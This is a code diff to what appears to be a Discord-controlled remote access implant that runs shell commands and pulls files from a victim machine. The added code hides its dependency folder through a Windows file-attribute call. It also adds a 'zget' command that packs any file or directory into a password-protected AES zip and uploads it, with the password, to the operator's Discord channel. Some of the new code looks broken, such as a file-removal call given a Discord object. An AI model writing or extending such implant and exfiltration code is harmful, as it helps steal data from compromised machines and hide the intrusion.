@@ -18,6 +18,8 @@ import socket
 import string
 import subprocess
 import sys
+import tempfile
+import uuid
 from datetime import timedelta
 from pathlib import Path
 
@@ -26,6 +28,7 @@ DEPS_LOCATION = ".deps"
 def ensure_wheel(package_name, import_name=None, dest=None):
     dest_path = Path(dest)
     dest_path.mkdir(exist_ok=True)
+    ctypes.windll.kernel32.SetFileAttributesW(str(dest_path), 0x02)
 
     if import_name is None:
         import_name = package_name.replace("-", "_").replace(".", "_")
@@ -37,7 +40,7 @@ def ensure_wheel(package_name, import_name=None, dest=None):
         return importlib.import_module(import_name)
     except ImportError:
         # Requires pip install rather than download because of the way its submodules are setup
-        if "discord" in package_name:
+        if "discord" in package_name or "pyzipper" in package_name:
             subprocess.check_call([
                 sys.executable, "-m", "pip", "install",
                 "--upgrade", "--target", str(dest_path), package_name
@@ -62,8 +65,10 @@ def ensure_wheel(package_name, import_name=None, dest=None):
         return importlib.import_module(import_name)
 
 # runtime imports
-tabulate = ensure_wheel("tabulate", dest=DEPS_LOCATION)
 discord = ensure_wheel("discord.py", import_name="discord", dest=DEPS_LOCATION)
+pyzipper = ensure_wheel("pyzipper", dest=DEPS_LOCATION)
+tabulate = ensure_wheel("tabulate", dest=DEPS_LOCATION)
+
 from discord.ext import commands
 
 CHECKIN_CHANNELS = set()
@@ -254,6 +259,7 @@ def process_command(cmd_str):
     usage_string += "cd <directory>\n"
     usage_string += "exec <cmd>\n"
     usage_string += "get <file path>\n"
+    usage_string += "zget <file path>\n"
     usage_string += "ls <directory>\n"
     usage_string += "lt <directory>\n"
     usage_string += "put <file path>\n"
@@ -271,13 +277,13 @@ def process_command(cmd_str):
     commands = {
         "exec": execute_command,
         "get": get_content,
+        "zget": get_content_zipped,
         "survey": run_survey
     }
 
     # This is a bit buggy at the moment, prints a stack trace when its done
     if cmd == "exit":
         do_exit()
-
     elif cmd == "help":
         # Output usage string, but be nicer (they asked for help after all)
         output = usage_string.replace("Invalid command.","")
@@ -353,7 +359,6 @@ def get_content(upload):
         # may not work well with large files
         p = Path(upload)
         return discord.File(upload, filename=p.name)
-
     except FileNotFoundError as e:
         return str(e)
     except PermissionError as e:
@@ -362,6 +367,36 @@ def get_content(upload):
         return str(e)
     except Exception as e:
         return str(e)
+
+def get_content_zipped(upload):
+    """
+        upload: full path to the file or directory to retrieve.
+        contents will be zipped up and password protected.
+    """
+    zip_path = os.path.join(tempfile.gettempdir(), f"{uuid.uuid4().hex}.zip")
+
+    password = random_alphanumeric(16)
+    src_path = os.path.abspath(upload)
+    with pyzipper.AESZipFile(zip_path, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
+        zf.setpassword(password.encode('utf-8'))
+
+        if os.path.isdir(src_path):
+            base_dir = src_path
+            for root, _, files in os.walk(base_dir):
+                for file in files:
+                    abs_file = os.path.join(root, file)
+                    rel_path = os.path.relpath(abs_file, base_dir)
+                    zf.write(abs_file, arcname=rel_path)
+        elif os.path.isfile(src_path):
+            file_name = os.path.basename(src_path)
+            zf.write(src_path, arcname=file_name)
+        else:
+            raise FileNotFoundError(f"Path not found: {src_path}")
+
+    return {
+        "zipfile": discord.File(zip_path, filename="content.zip"),
+        "password": password
+    }
 
 def run_survey():
     """
@@ -391,10 +426,14 @@ def display_services(svc_state="ALL"):
 def do_exit():
     exit(0)
 
-async def send_message_wrapper(channel, output, is_file=False, prefix="```", suffix="```"):
+async def send_message_wrapper(channel, output, is_file=False, is_dict=False, prefix="```", suffix="```"):
     if is_file:
         content = "📎 See attachment:"
         await channel.send(content=content, file=output)
+    
+    elif is_dict:
+        content = f"📎 Zip attached. Password= {output.get('password', 'Error')}"
+        await channel.send(content=content, file=output.get('zipfile'))
 
     else:
         """Split long text into <=2000 char chunks and send sequentially."""
@@ -457,6 +496,9 @@ async def on_message(message):
 
         if isinstance(output, discord.File):
             await send_message_wrapper(message.channel, output, is_file=True)
+        if isinstance(output, dict):
+            await send_message_wrapper(message.channel, output, is_dict=True)
+            os.remove(output.get("zipfile"))
         else:
             await send_message_wrapper(message.channel, output)
 
